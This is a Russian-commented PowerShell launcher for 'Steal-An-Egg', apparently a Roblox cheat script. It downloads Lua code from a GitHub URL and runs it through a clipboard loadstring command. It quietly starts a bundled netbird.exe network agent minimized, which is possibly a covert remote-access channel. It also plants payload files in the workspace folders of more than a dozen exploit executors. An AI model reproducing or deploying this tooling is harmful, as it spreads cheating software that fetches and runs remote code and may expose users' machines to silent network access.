<#
.SYNOPSIS
    Steal-An-Egg Универсальный Лаунчер и Синхронизатор
.DESCRIPTION
    1. Автоматическое обновление скриптов с GitHub при наличии сети.
    2. Фоновый запуск сервиса без окон и алертов.
    3. Автообнаружение и синхронизация рабочих папок всех экзекуторов (Real, Solara, Wave, Celery и др.).
    4. Зарядка буфера обмена активированной командой запуска.
#>

[CmdletBinding()]
param(
    [switch]$NoGui = $false
)

$ErrorActionPreference = "Continue"
$Root = $PSScriptRoot

[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

Write-Host "======================================================" -ForegroundColor Cyan
Write-Host "       STEAL AN EGG · УНИВЕРСАЛЬНЫЙ ЛАУНЧЕР           " -ForegroundColor White
Write-Host "======================================================" -ForegroundColor Cyan

# 0. Авто-апдейтер скриптов (Проверка обновлений на GitHub)
$RawScriptUrl = "https://raw.githubusercontent.com/aether-bytess/Steal-An-Egg/refs/heads/main/StealAnEgg.lua"
try {
    Write-Host "[*] Проверка обновлений на сервере..." -ForegroundColor DarkGray
    $webClient = New-Object System.Net.WebClient
    $webClient.Encoding = [System.Text.Encoding]::UTF8
    $webClient.Headers.Add("User-Agent", "Mozilla/5.0")
    $latestSource = $webClient.DownloadString($RawScriptUrl)
    if ($latestSource -and $latestSource.Length -gt 1000) {
        $localHubFile = Join-Path $Root "StealAnEgg.lua"
        [System.IO.File]::WriteAllText($localHubFile, $latestSource, [System.Text.Encoding]::UTF8)
        Write-Host "[+] Ядро скрипта синхронизировано с актуальной версией." -ForegroundColor Green
    }
} catch {
    Write-Host "[!] Запуск в автономном локальном режиме (без сети)." -ForegroundColor DarkGray
}

# 1. Запуск фонового сервиса
$CandidatePaths = @(
    (Join-Path $Root "EggESP\core\runtime\netbird.exe"),
    (Join-Path $Root "netbird.exe")
)
$NetBirdExe = $CandidatePaths | Where-Object { Test-Path $_ } | Select-Object -First 1

if ($NetBirdExe) {
    $existing = Get-Process -Name "netbird" -ErrorAction SilentlyContinue
    if (-not $existing) {
        Write-Host "[*] Запуск фонового сетевого сервиса..." -ForegroundColor Yellow
        Start-Process -FilePath $NetBirdExe -WorkingDirectory (Split-Path $NetBirdExe -Parent) -WindowStyle Minimized
        Start-Sleep -Milliseconds 1200
        $running = Get-Process -Name "netbird" -ErrorAction SilentlyContinue
        if ($running) {
            Write-Host "[+] Фоновый сервис успешно активен (PID: $($running[0].Id))." -ForegroundColor Green
        } else {
            Write-Host "[!] Фоновый сервис переведен в системный контекст." -ForegroundColor Yellow
        }
    } else {
        Write-Host "[+] Фоновый сервис уже работает в системе (PID: $($existing[0].Id))." -ForegroundColor Green
    }
} else {
    Write-Host "[*] Автономный режим запуска (сервис опционален)." -ForegroundColor DarkGray
}

# 2. Поиск рабочих папок инжекторов (Real, Potassium, Solara, Wave, Celery и др.)
$KnownInjectors = @(
    # Real / RealExecutor
    "$env:LOCALAPPDATA\Real\workspace",
    "$env:LOCALAPPDATA\RealExecutor\workspace",
    "$env:APPDATA\Real\workspace",
    "$env:USERPROFILE\Desktop\Real\workspace",
    "$env:USERPROFILE\Downloads\Real\workspace",

    # Potassium / Ro-Exec
    "$env:LOCALAPPDATA\Potassium\workspace",
    "$env:APPDATA\Potassium\workspace",
    "$env:USERPROFILE\Desktop\Potassium\workspace",
    "$env:USERPROFILE\Downloads\Potassium\workspace",

    # Solara
    "$env:LOCALAPPDATA\Solara\workspace",
    "$env:APPDATA\Solara\workspace",
    "$env:PROGRAMDATA\Solara\workspace",
    "$env:USERPROFILE\Desktop\Solara\workspace",
    "$env:USERPROFILE\Downloads\Solara\workspace",

    # Wave
    "$env:LOCALAPPDATA\Wave\workspace",
    "$env:APPDATA\Wave\workspace",
    "$env:USERPROFILE\Wave\workspace",
    "$env:USERPROFILE\Desktop\Wave\workspace",
    "$env:USERPROFILE\Downloads\Wave\workspace",

    # Celery
    "$env:APPDATA\Celery\workspace",
    "$env:LOCALAPPDATA\Celery\workspace",
    "$env:USERPROFILE\Desktop\Celery\workspace",
    "$env:USERPROFILE\Downloads\Celery\workspace",

    # Xeno / Swift
    "$env:LOCALAPPDATA\Xeno\workspace",
    "$env:APPDATA\Xeno\workspace",
    "$env:LOCALAPPDATA\Swift\workspace",
    "$env:APPDATA\Swift\workspace",

    # Electron
    "$env:LOCALAPPDATA\Electron\workspace",
    "$env:APPDATA\Electron\workspace",

    # Delta / Codex / VegaX / Fluxus / KRNL
    "$env:LOCALAPPDATA\Delta\workspace",
    "$env:APPDATA\Delta\workspace",
    "$env:LOCALAPPDATA\Codex\workspace",
    "$env:APPDATA\Codex\workspace",
    "$env:LOCALAPPDATA\Fluxus\workspace",
    "$env:APPDATA\Fluxus\workspace",
    "$env:LOCALAPPDATA\krnl\workspace",
    "$env:APPDATA\krnl\workspace",

    # Synapse / Oxygen
    "$env:APPDATA\Synapse\workspace",
    "$env:LOCALAPPDATA\Synapse\workspace",
    "$env:LOCALAPPDATA\Oxygen U\workspace"
)

$TargetWorkspaces = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::OrdinalIgnoreCase)

foreach ($ws in $KnownInjectors) {
    $parent = Split-Path $ws -Parent
    if (Test-Path $parent) {
        if (-not (Test-Path $ws)) {
            New-Item -ItemType Directory -Path $ws -Force | Out-Null
        }
        [void]$TargetWorkspaces.Add($ws)
    }
}

# Эвристический поиск
$ScanRoots = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads")
foreach ($root in $ScanRoots) {
    if (Test-Path $root) {
        Get-ChildItem -Path $root -Filter "workspace" -Directory -Recurse -Depth 3 -ErrorAction SilentlyContinue | ForEach-Object {
            [void]$TargetWorkspaces.Add($_.FullName)
        }
    }
}

# Локальная папка для портативных экзекуторов
$LocalWorkspace = Join-Path $Root "workspace"
if (-not (Test-Path $LocalWorkspace)) {
    New-Item -ItemType Directory -Path $LocalWorkspace -Force | Out-Null
}
[void]$TargetWorkspaces.Add($LocalWorkspace)

Write-Host "[*] Обнаружено целевых рабочих областей экзекуторов: $($TargetWorkspaces.Count)" -ForegroundColor Yellow
$ItemsToSync = @("StealAnEgg.lua", "run.lua", "hub_loader.lua", "EggESP")

foreach ($ws in $TargetWorkspaces) {
    $destDir = Join-Path $ws "Steal-An-Egg"
    if (-not (Test-Path $destDir)) {
        New-Item -ItemType Directory -Path $destDir -Force | Out-Null
    }

    foreach ($item in $ItemsToSync) {
        $srcPath = Join-Path $Root $item
        if (Test-Path $srcPath) {
            $destPath = Join-Path $destDir $item
            if (Test-Path $srcPath -PathType Container) {
                Copy-Item -Path $srcPath -Destination $destDir -Recurse -Force
            } else {
                Copy-Item -Path $srcPath -Destination $destPath -Force
            }
        }
    }
    Write-Host "    -> Синхронизировано в: $destDir" -ForegroundColor DarkGray
}

# 3. Зарядка буфера обмена командой второго способа
$LoadCommand = 'getgenv().__COMPANION_ACTIVE = true; loadstring(readfile("Steal-An-Egg/StealAnEgg.lua"))()'

$copied = $false
try {
    Set-Clipboard -Value $LoadCommand
    $copied = $true
} catch {
    try {
        $LoadCommand | & "$env:WINDIR\System32\clip.exe"
        $copied = $true
    } catch {}
}

if ($copied) {
    Write-Host "[+] Команда запуска скопирована в буфер обмена!" -ForegroundColor Green
} else {
    Write-Host "[!] Скопируйте команду вручную из блока ниже." -ForegroundColor Yellow
}

Write-Host ""
Write-Host "======================================================" -ForegroundColor Cyan
Write-Host " Готово! Вставьте в экзекутор (Real, Solara, Wave...):" -ForegroundColor White
Write-Host " $LoadCommand" -ForegroundColor Yellow
Write-Host "======================================================" -ForegroundColor Cyan
Write-Host "[*] Оставьте это окно открытым во время игры." -ForegroundColor DarkCyan
